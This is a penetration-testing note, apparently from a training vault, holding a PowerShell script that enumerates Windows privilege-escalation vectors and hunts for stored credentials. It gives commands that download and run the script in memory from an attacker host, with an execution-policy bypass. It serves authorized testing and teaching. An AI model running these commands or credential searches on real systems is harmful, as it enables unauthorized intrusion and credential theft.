# PowerShell Privilege Escalation Enumeration

A single, dependency-free PowerShell script that automates the discovery half of Windows privilege escalation — the concrete implementation of Step 1 in [Escalate My Privilege Windows](Escalate-My-Privilege-Windows.md). It walks the same vectors this module teaches (token privileges, group memberships, service misconfigurations, registry, scheduled tasks, stored credentials) and prints a `[+]` for each finding with a pointer to the technique note that exploits it. It needs no administrator rights and no external binary, so it runs where you cannot drop [WinPEAS or PowerUp](Privilege-Escalation-Tools.md) — a constrained shell, an offline host, or a box where dropping tooling is too loud.

> [!warning]
> **Authorized use only.** Enumeration is noisy and easily logged. Run this only against a host you own or are explicitly authorized to test. For what a defender sees while this runs, see [Situational Awareness](Situational-Awareness.md).

## The script

Save as `privesc-enum.ps1`, or paste the functions into a session and call `Invoke-PrivEscScan`. Each check is standalone, so you can run one at a time in a restricted shell.

```powershell
# ---------------------------------------------------------------------------
# privesc-enum.ps1 - dependency-free Windows privilege-escalation enumeration
# Authorized testing only.
# ---------------------------------------------------------------------------

function Write-Good($m) { Write-Host "[+] $m" -ForegroundColor Green }
function Write-Bad ($m) { Write-Host "[-] $m" -ForegroundColor DarkGray }
function Write-Head($m) { Write-Host "`n==== $m ====" -ForegroundColor Cyan }

# Directories a low-privileged user can typically write to
$WritableSids = @('S-1-5-32-545','S-1-5-11','S-1-1-0','S-1-5-32-547')  # Users, Auth Users, Everyone, Power Users

function Test-Writable($path) {
    if (-not $path -or -not (Test-Path $path)) { return $false }
    try {
        $acl = Get-Acl $path -ErrorAction Stop
        foreach ($ace in $acl.Access) {
            if ($ace.AccessControlType -ne 'Allow') { continue }
            $rights = $ace.FileSystemRights.ToString()
            if ($rights -notmatch 'Write|Modify|FullControl|CreateFiles') { continue }
            try { $sid = $ace.IdentityReference.Translate([Security.Principal.SecurityIdentifier]).Value }
            catch { $sid = $ace.IdentityReference.Value }
            if ($WritableSids -contains $sid -or $sid -eq ([Security.Principal.WindowsIdentity]::GetCurrent().User.Value)) { return $true }
        }
    } catch {}
    return $false
}

function Get-Context {
    Write-Head 'Current context'
    whoami
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    Write-Host ("Integrity : " + ($id.Groups | ForEach-Object { $_.Translate([Security.Principal.NTAccount]).Value } | Where-Object { $_ -match 'Mandatory Level' }))
    Write-Host ("Admin     : " + ([Security.Principal.WindowsPrincipal]$id).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
}

function Get-TokenPrivileges {
    Write-Head 'Token privileges  ->  [[Token-Privilege-Abuse]]'
    $map = @{
        'SeImpersonatePrivilege'        = 'potato attacks -> [[PrintSpoofer]] / [[God-Potato]]'
        'SeAssignPrimaryTokenPrivilege' = 'potato attacks -> [[Impersonation-and-Potato-Attacks]]'
        'SeBackupPrivilege'             = 'read any file  -> [[SeBackup-and-SeRestore-Abuse]]'
        'SeRestorePrivilege'            = 'write any file -> [[SeBackup-and-SeRestore-Abuse]]'
        'SeDebugPrivilege'              = 'open any process -> [[SeDebug-Abuse]]'
        'SeTakeOwnershipPrivilege'      = 'own any object -> [[SeTakeOwnership-Abuse]]'
        'SeLoadDriverPrivilege'         = 'load a driver -> [[SeLoadDriver-Abuse]]'
    }
    $held = (whoami /priv) -join "`n"
    foreach ($p in $map.Keys) {
        if ($held -match [regex]::Escape($p)) { Write-Good "$p  ($($map[$p]))" } else { Write-Bad "$p not held" }
    }
}

function Get-PrivilegedGroups {
    Write-Head 'Privileged group membership  ->  [[Windows-Built-in-Groups]]'
    $groups = @{
        'S-1-5-32-551' = 'Backup Operators  -> [[Backup-Operators]]'
        'S-1-5-32-549' = 'Server Operators  -> [[Server-Operators]]'
        'S-1-5-32-550' = 'Print Operators   -> [[Print-Operators]]'
        'S-1-5-32-573' = 'Event Log Readers -> [[Event-Log-Readers]]'
        'S-1-5-32-578' = 'Hyper-V Administrators -> [[Hyper-V-Administrators]]'
    }
    $mine = [Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Value }
    foreach ($sid in $groups.Keys) {
        if ($mine -contains $sid) { Write-Good $groups[$sid] } else { Write-Bad ($groups[$sid] -replace ' *->.*','') }
    }
    # DnsAdmins is domain-specific (no fixed RID)
    if ((whoami /groups) -match 'DnsAdmins') { Write-Good 'DnsAdmins -> [[DnsAdmins]]' }
}

function Get-UacState {
    Write-Head 'UAC / integrity  ->  [[UAC-Bypass]]'
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $isAdmin  = ([Security.Principal.WindowsPrincipal]$id).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $medium   = (whoami /groups) -match 'Medium Mandatory Level'
    if ($isAdmin -and $medium) { Write-Good 'Admin token at Medium integrity -> UAC bypass (fodhelper/eventvwr)' }
    else { Write-Bad 'Not an unelevated admin (UAC bypass n/a)' }
}

function Get-UnquotedServices {
    Write-Head 'Unquoted service paths  ->  [[Unquoted-Service-Path-Vulnerability]]'
    Get-CimInstance Win32_Service | Where-Object {
        $_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.PathName -notmatch '^[A-Za-z]:\\Windows'
    } | ForEach-Object { Write-Good ("{0} :: {1}" -f $_.Name, $_.PathName) }
}

function Get-WeakServiceBinaries {
    Write-Head 'Writable service binaries  ->  [[Insecure-File-Permissions-Service-Executable-Files-Path]]'
    Get-CimInstance Win32_Service | ForEach-Object {
        if ($_.PathName -match '^"?([A-Za-z]:\\[^"]+?\.exe)') {
            $exe = $Matches[1]
            if ($exe -notmatch '^[A-Za-z]:\\Windows' -and (Test-Writable $exe)) {
                Write-Good ("{0} -> writable binary {1}  (also check binPath ACL -> [[Insecure-Service-Permissions(binPath)]])" -f $_.Name, $exe)
            }
        }
    }
}

function Get-AlwaysInstallElevated {
    Write-Head 'AlwaysInstallElevated  ->  [[AlwaysInstallElevated-Exploitation]]'
    $hklm = (Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    $hkcu = (Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    if ($hklm -eq 1 -and $hkcu -eq 1) { Write-Good 'Both HKLM and HKCU = 1 -> any .msi installs as SYSTEM' }
    else { Write-Bad "HKLM=$hklm HKCU=$hkcu (need both = 1)" }
}

function Get-AutorunWritable {
    Write-Head 'Autorun targets  ->  [[Autorun-Registry-Persistence]]'
    'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run','HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce' | ForEach-Object {
        $key = $_
        (Get-Item $key -ErrorAction SilentlyContinue).Property | ForEach-Object {
            $val = (Get-ItemProperty $key -Name $_).$_
            if ($val -match '([A-Za-z]:\\[^"]+?\.exe)') {
                $exe = $Matches[1]
                if (Test-Writable $exe) { Write-Good ("{0} -> writable {1}" -f $_, $exe) }
            }
        }
    }
}

function Get-VulnScheduledTasks {
    Write-Head 'Scheduled tasks (SYSTEM, writable action)  ->  [[Privilege-Escalation-via-Scheduled-Tasks]]'
    Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.Principal.UserId -match 'SYSTEM|Administrator' } | ForEach-Object {
        foreach ($a in $_.Actions) {
            $exe = $a.Execute
            if ($exe -and $exe -notmatch '^[A-Za-z]:\\Windows' -and (Test-Writable $exe)) {
                Write-Good ("{0} runs {1} as {2}" -f $_.TaskName, $exe, $_.Principal.UserId)
            }
        }
    }
}

function Get-WritablePath {
    Write-Head 'Writable %PATH% dirs (DLL hijack)  ->  [[Dynamic-Link-Library-Hijacking(DLL-Hijacking)]]'
    $env:PATH -split ';' | Where-Object { $_ -and (Test-Writable $_) } | ForEach-Object { Write-Good $_ }
}

function Get-StoredCredentials {
    Write-Head 'Stored credentials  ->  [[Password-Mining]]'
    $wl = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
    $ap = Get-ItemProperty $wl -ErrorAction SilentlyContinue
    if ($ap.DefaultPassword) { Write-Good "Autologon password in registry -> [[Password-in-Windows-Registry]]" }
    Get-ChildItem 'C:\Windows\Panther','C:\Windows\System32\Sysprep' -Include Unattend.xml,sysprep.xml,unattended.xml -Recurse -ErrorAction SilentlyContinue |
        ForEach-Object { Write-Good "Unattend file: $($_.FullName) -> [[Unattended-Install-Files(Cleartext-Passwords)]]" }
    if (cmdkey /list 2>$null | Select-String 'Target:') { Write-Good "Saved credentials in Credential Manager (cmdkey /list)" }
    $hist = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
    if ((Test-Path $hist) -and (Select-String -Path $hist -Pattern 'pass|pwd|secret|-p ' -Quiet)) {
        Write-Good "Secrets in PowerShell history -> [[PowerShell-Command-History]]"
    }
    Get-ChildItem C:\ -Include *.kdbx,*.ppk,web.config -Recurse -ErrorAction SilentlyContinue |
        Select-Object -First 10 | ForEach-Object { Write-Good "Interesting file: $($_.FullName) -> [[Web-Configuration-Files-and-Sensitive-Data-Discovery]]" }
}

function Get-PatchLevel {
    Write-Head 'OS / patch level  ->  [[Windows-Kernel-Exploits]] / [[Windows-Version-and-Configuration]]'
    $os = Get-CimInstance Win32_OperatingSystem
    Write-Host ("{0} (build {1})" -f $os.Caption, $os.BuildNumber)
    $last = Get-HotFix -ErrorAction SilentlyContinue | Sort-Object InstalledOn -Descending | Select-Object -First 1
    if ($last) { Write-Host ("Latest hotfix: {0} on {1}" -f $last.HotFixID, $last.InstalledOn) }
    else { Write-Good "No hotfixes reported -> likely unpatched, feed systeminfo to an exploit suggester" }
}

function Invoke-PrivEscScan {
    Get-Context
    Get-TokenPrivileges
    Get-PrivilegedGroups
    Get-UacState
    Get-UnquotedServices
    Get-WeakServiceBinaries
    Get-AlwaysInstallElevated
    Get-AutorunWritable
    Get-VulnScheduledTasks
    Get-WritablePath
    Get-StoredCredentials
    Get-PatchLevel
    Write-Host "`n[*] Scan complete. Follow each [+] into its technique note." -ForegroundColor Yellow
}

Invoke-PrivEscScan
```

## Run it

From an attacker HTTP server (see the file-transfer notes for hosting), pull and run entirely in memory — nothing touches disk:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/privesc-enum.ps1')
```

If script execution is blocked, run per-process without changing policy:

```powershell
powershell -ep bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/privesc-enum.ps1')"
```

Or paste the functions into an existing session and call a single check, e.g. `Get-TokenPrivileges`, when you only want one vector.

## Reading the output

Every green `[+]` is a candidate escalation path; the note named after the arrow tells you how to exploit it. Work the strongest first — a token-privilege or service-binary hit is usually faster than chasing a kernel exploit. `Test-Writable` is deliberately conservative (it checks Users / Authenticated Users / Everyone / your own SID), so a hit is high-confidence but absence is not proof — verify borderline cases by hand with `icacls`, and cross-check with [WinPEAS/PowerUp](Privilege-Escalation-Tools.md) when you can run them. This script is discovery only; exploitation lives in the linked notes, and the full method is in [Escalate My Privilege Windows](Escalate-My-Privilege-Windows.md).

## Related
- [Windows Privilege Escalation](README.md) — category MOC
- [Escalate My Privilege Windows](Escalate-My-Privilege-Windows.md) — the methodology this automates (Step 1)
- [Privilege Escalation Tools](Privilege-Escalation-Tools.md) — WinPEAS/PowerUp/Seatbelt when you can drop tooling
- [Situational Awareness](Situational-Awareness.md) — the detection surface to check before running this
- [Token Privilege Abuse](Token-Privilege-Abuse/Token-Privilege-Abuse.md) · [Services Exploitation](Services-Exploitation/Services-Exploitation.md) · [Windows Built in Groups](Windows-Built-in-Groups/Windows-Built-in-Groups.md) · [Password Mining](Password-Mining/Password-Mining.md) — the vectors it discovers
